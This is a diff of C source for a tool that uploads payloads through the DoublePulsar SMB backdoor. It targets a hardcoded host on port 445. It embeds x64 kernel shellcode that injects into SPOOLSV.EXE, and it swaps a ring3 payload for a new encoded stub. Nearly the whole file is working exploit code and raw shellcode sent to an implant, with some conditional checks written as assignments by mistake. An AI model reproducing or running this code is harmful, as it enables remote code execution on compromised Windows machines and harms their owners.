@@ -396,7 +396,13 @@ uint32_t generate_process_hash(const char* process) {
 	free(proc);
 	return proc_hash;
 }
-	
+
+int kernel_shellcode_size = 0;
+int shellcode_one_part_len = 0;
+int shellcode_part_two_len = 0;
+int userland_shellcode_size = 0;
+unsigned char hMem[4096];
+
 unsigned char recvbuff[2048];
 int main(int argc, char* argv[])
 {
@@ -414,7 +420,7 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 	server.sin_family = AF_INET;
-	server.sin_addr.s_addr = inet_addr(argv[1]);
+	server.sin_addr.s_addr = inet_addr("192.168.0.70");
 	server.sin_port = htons((USHORT)445);
 	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
 
@@ -439,7 +445,7 @@ int main(int argc, char* argv[])
 	ptr = packet;
 	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
 	ptr += sizeof(SMB_TreeConnectAndX) - 1;
-	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
+	sprintf((char*)tmp, "\\\\192.168.0.70\\IPC$");
 	convert_name((char*)ptr, (char*)tmp);
 	smblen = strlen((char*)tmp) * 2;
 	ptr += smblen;
@@ -613,7 +619,7 @@ int main(int argc, char* argv[])
 		//nb->length = htons(4174); //NetBIOS size = totalPacketSize - 4 ( NetBIOS header is not counted )
 		//Size of smb_header + size of Trans2_Response header + parameter size + SMB_Data are counted in the packet size
 		//nb->length = htons(4174);
-		nb->length = htons(sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters) + sizeof(smb_data) - 4);
+		nb->length = htons(sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters) + sizeof(smb_data));
 
 		/*
 		uint16_t htons_len = htons(4174);
@@ -688,18 +694,13 @@ int main(int argc, char* argv[])
 		//make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
 		//In this case, this is static but will change to be dynamic in the future.
 
-		int SIZE_OF_PAYLOAD = 4096;
-		unsigned long DataSize = SIZE_OF_PAYLOAD; // 0x507308 ^ XorKey;
+		unsigned int TotalSizeOfPayload = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+		unsigned int ChunkSize = 4096; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+		unsigned int OffsetofChunkinPayload = 0x0000;
 
-		//size of the chunk of the payload being sent.
-		unsigned long chunksize = 4096; // 4096 ^ XorKey;
-
-		//offset begins at 0 and increments based on the previous packets sent
-		unsigned long offset = 0; // 0 ^ XorKey;
-
-		memcpy(smb_params->parameters, (unsigned char*)&DataSize, 4);
-		memcpy(smb_params->parameters + 4, (unsigned char*)&chunksize, 4);
-		memcpy(smb_params->parameters + 8, (unsigned char*)&offset, 4);
+		memcpy(smb_params->parameters, (unsigned char*)&TotalSizeOfPayload, 4);
+		memcpy(smb_params->parameters + 4, (unsigned char*)&ChunkSize, 4);
+		memcpy(smb_params->parameters + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 		hexDump(0, smb_params->parameters, 12);
 		int i;
 
@@ -710,16 +711,16 @@ int main(int argc, char* argv[])
 		hexDump(0, smb_params->parameters, 12);
 
 		unsigned char hMem[4096];
-		const char* proc_name = "SPOOLSV.EXE"; 
+		const char* proc_name = "SPOOLSV.EXE";
 		uint32_t hash = generate_process_hash(proc_name);
 		printf("Process Hash for %s: 0x%08X\n", proc_name, hash);
 
 		//void make_kernel_shellcode(const uint8_t* ring3, size_t ring3_len, const char* proc_name) {
 		uint32_t proc_hash = generate_process_hash(proc_name);
-	
+
 		//Length: 780 bytes
-		unsigned char shellcode[] = 
-		 "\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53"
+		unsigned char shellcode[] =
+			"\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53"
 			"\x55\x48\x89\xe5\x66\x83\xe4\xf0\x48\x83\xec\x20\x4c\x8d\x35\xe3"
 			"\xff\xff\xff\x65\x4c\x8b\x3c\x25\x38\x00\x00\x00\x4d\x8b\x7f\x04"
 			"\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x49"
@@ -732,8 +733,8 @@ int main(int argc, char* argv[])
 			"\x4c\x89\xf2\x89\xcb\x41\xbb\x66\x55\xa2\x4b\xe8\xbc\x01\x00\x00"
 			"\x85\xc0\x75\xdb\x49\x8b\x0e\x41\xbb\xa3\x6f\x72\x2d\xe8\xaa\x01"
 			"\x00\x00\x48\x89\xc6\xe8\x50\x01\x00\x00\x41\x81\xf9";
-	
-		unsigned char shellcode_part_two[] = 
+
+		unsigned char shellcode_part_two[] =
 			"\x75\xbc\x49\x8b\x1e\x4d\x8d\x6e\x10\x4c\x89\xea\x48\x89\xd9"
 			"\x41\xbb\xe5\x24\x11\xdc\xe8\x81\x01\x00\x00\x6a\x40\x68\x00\x10"
 			"\x00\x00\x4d\x8d\x4e\x08\x49\xc7\x01\x00\x10\x00\x00\x4d\x31\xc0"
@@ -772,53 +773,48 @@ int main(int argc, char* argv[])
 			"\x68\xff\xff\xff\x48\x89\xec\x5d\x41\x5f\x5e\xc3";
 
 		unsigned char ring3[] =
-			"\x31\xdb\xb3\x30\x29\xdc\x64\x8b\x03\x8b\x40\x0c\x8b"
-			"\x58\x1c\x8b\x1b\x8b\x1b\x8b\x73\x08\x89\xf7\x89\x3c"
-			"\x24\x8b\x47\x3c\x01\xc7\x31\xdb\xb3\x78\x01\xdf\x8b"
-			"\x3f\x8b\x04\x24\x01\xf8\x89\x44\x24\x08\x31\xdb\xb3"
-			"\x1c\x01\xc3\x8b\x03\x8b\x3c\x24\x01\xf8\x89\x44\x24"
-			"\x0c\x8b\x44\x24\x08\x31\xdb\xb3\x20\x01\xc3\x8b\x03"
-			"\x01\xf8\x89\x44\x24\x10\x8b\x44\x24\x08\x31\xdb\xb3"
-			"\x24\x01\xc3\x8b\x03\x01\xf8\x89\x44\x24\x14\x8b\x44"
-			"\x24\x08\x31\xdb\xb3\x18\x01\xc3\x8b\x03\x89\x44\x24"
-			"\x18\x8b\x74\x24\x30\x31\xf6\x89\x74\x24\x30\x8b\x4c"
-			"\x24\x18\x8b\x2c\x24\x8b\x5c\x24\x10\x8b\x4c\x24\x18"
-			"\x85\xc9\x74\x5f\x49\x89\x4c\x24\x18\x8b\x34\x8b\x01"
-			"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf"
-			"\x0d\x01\xc7\xeb\xf4\x8b\x5c\x24\x14\x66\x8b\x0c\x4b"
-			"\x8b\x5c\x24\x0c\x8b\x04\x8b\x01\xe8\x8b\x34\x24\x81"
-			"\xff\xaa\xfc\x0d\x7c\x75\x08\x8d\x74\x24\x20\x89\x06"
-			"\xeb\xb5\x81\xff\x8e\x4e\x0e\xec\x75\x08\x8d\x74\x24"
-			"\x24\x89\x06\xeb\xa5\x81\xff\x7e\xd8\xe2\x73\x75\x9d"
-			"\x8d\x74\x24\x1c\x89\x06\xeb\x95\x89\xe6\x31\xd2\x66"
-			"\xba\x6c\x6c\x52\x68\x33\x32\x2e\x64\x68\x75\x73\x65"
-			"\x72\x54\xff\x56\x24\x89\x46\x28\x31\xd2\xb2\x41\x52"
-			"\x31\xd2\x66\xba\x6f\x78\x66\x52\x68\x61\x67\x65\x42"
-			"\x68\x4d\x65\x73\x73\x54\x50\xff\x56\x20\x89\x46\x2c"
-			"\x31\xd2\xb2\x20\x52\x31\xd2\x66\xba\x74\x6f\x66\x52"
-			"\x68\x69\x79\x61\x6e\x68\x46\x65\x62\x72\x89\xe3\x31"
-			"\xd2\xb2\x6f\x52\x68\x48\x65\x6c\x6c\x89\xe1\x31\xd2"
-			"\xb2\x04\x52\x31\xd2\x51\x53\x31\xff\x57\xff\x56\x2c"
-			"\x89\xf4\x57\xff\x54\x24\x20";
+			"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
+			"\xff\xff\xff\x48\xbb\x1d\xab\xfd\x0e\xd7\x3a\xd2\x27\x48"
+			"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xe3\x7e"
+			"\xea\x27\xd2\x12\x27\x1d\xab\xbc\x5f\x96\x6a\x80\x76\x4b"
+			"\xe3\xcc\xdc\xb2\x72\x59\x75\x7d\xe3\x76\x5c\xcf\x72\x59"
+			"\x75\x3d\xe3\x76\x7c\x87\x72\xdd\x90\x57\xe1\xb0\x3f\x1e"
+			"\x72\xe3\xe7\xb1\x97\x9c\x72\xd5\x16\xf2\x66\xdc\x62\xf0"
+			"\x4f\xd6\xfb\x30\xca\x4f\xea\xac\x46\x5c\x68\xf2\xac\x5f"
+			"\x97\xb5\x0f\x07\xb1\x52\xaf\x1d\xab\xfd\x46\x52\xfa\xa6"
+			"\x40\x55\xaa\x2d\x5e\x5c\x72\xca\x63\x96\xeb\xdd\x47\xd6"
+			"\xea\x31\x71\x55\x54\x34\x4f\x5c\x0e\x5a\x6f\x1c\x7d\xb0"
+			"\x3f\x1e\x72\xe3\xe7\xb1\xea\x3c\xc7\xda\x7b\xd3\xe6\x25"
+			"\x4b\x88\xff\x9b\x39\x9e\x03\x15\xee\xc4\xdf\xa2\xe2\x8a"
+			"\x63\x96\xeb\xd9\x47\xd6\xea\xb4\x66\x96\xa7\xb5\x4a\x5c"
+			"\x7a\xce\x6e\x1c\x7b\xbc\x85\xd3\xb2\x9a\x26\xcd\xea\xa5"
+			"\x4f\x8f\x64\x8b\x7d\x5c\xf3\xbc\x57\x96\x60\x9a\xa4\xf1"
+			"\x8b\xbc\x5c\x28\xda\x8a\x66\x44\xf1\xb5\x85\xc5\xd3\x85"
+			"\xd8\xe2\x54\xa0\x46\x6d\x3b\xd2\x27\x1d\xab\xfd\x0e\xd7"
+			"\x72\x5f\xaa\x1c\xaa\xfd\x0e\x96\x80\xe3\xac\x72\x2c\x02"
+			"\xdb\x6c\xca\x67\x85\x4b\xea\x47\xa8\x42\x87\x4f\xd8\xc8"
+			"\xe3\x7e\xca\xff\x06\xd4\x5b\x17\x2b\x06\xee\xa2\x3f\x69"
+			"\x60\x0e\xd9\x92\x64\xd7\x63\x93\xae\xc7\x54\x28\x6d\xb6"
+			"\x56\xb1\x09\x78\xd3\x98\x0e\xd7\x3a\xd2\x27";
 
 		size_t ring3_len = sizeof(ring3) / sizeof(ring3[0]);
 		ring3_len -= 1;
-		
+
 		shellcode_one_part_len = sizeof(shellcode) / sizeof(shellcode[0]);
 		shellcode_one_part_len -= 1; //remove NULL terminator
-	
+
 		shellcode_part_two_len = sizeof(shellcode_part_two) / sizeof(shellcode_part_two[0]);
 		shellcode_part_two_len -= 1; //remove NULL terminator
-	
+
 		kernel_shellcode_size = shellcode_one_part_len + shellcode_part_two_len + 4;
 
 		printf("Total size of kernel shellcode:  %d\n", kernel_shellcode_size);
-	
+
 		memset(hMem, 0x90, 4096);
 		memcpy(hMem, shellcode, shellcode_one_part_len);
 		memcpy(hMem + shellcode_one_part_len, &proc_hash, sizeof(proc_hash));
 		memcpy(hMem + shellcode_one_part_len + sizeof(proc_hash), shellcode_part_two, shellcode_part_two_len);
-	
+
 		memcpy(hMem + kernel_shellcode_size, &ring3_len, sizeof(uint16_t));
 		memcpy(hMem + kernel_shellcode_size + sizeof(uint16_t), ring3, ring3_len);
 
@@ -831,7 +827,7 @@ int main(int argc, char* argv[])
 			exit(1);
 		}
 		*/
-			
+
 		//might need to make this static due to sizeof being garbage @ counting shellcode
 		//unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
 		//unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);
@@ -856,7 +852,7 @@ int main(int argc, char* argv[])
 		//wPayloadShellcodeSize -= 1;
 
 		memset(SMBDATA->smbdata, 0, 4096);
-		memcpy(SMBDATA->smbdata, hMem, 4096);
+		memcpy((unsigned char*)SMBDATA->smbdata, (unsigned char*)hMem, 4096);
 		//hexDump(0, SMBDATA->smbdata, 4096);
 
 		//copy kernel shellcode to encrypted buffer
@@ -884,6 +880,10 @@ int main(int argc, char* argv[])
 		send(sock, (char*)buffer, sizeof(buffer), 0);
 		recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
+		//hexDump(0, hMem, 4096);
+		//printf("\n\n\n");
+		//hexDump(0, buffer, 4096);
+
 		SMB_TRANS2_RESPONSE* transaction_response = (SMB_TRANS2_RESPONSE*)recvbuff;
 
 		//DoublePulsar response: STATUS_NOT_IMPLEMENTED
@@ -891,12 +891,12 @@ int main(int argc, char* argv[])
 		{
 			printf("All data sent and got good response from DoublePulsar!\n");
 		}
-		
+
 		if (transaction_response->multipleID = 0x52)
 		{
 			printf("Doublepulsar returned: Success!\n");
 		}
-		if (transaction_response->multipleID = 0x62)
+		else if (transaction_response->multipleID = 0x62)
 		{
 			printf("Doublepulsar returned: Invalid parameters!\n");
 		}
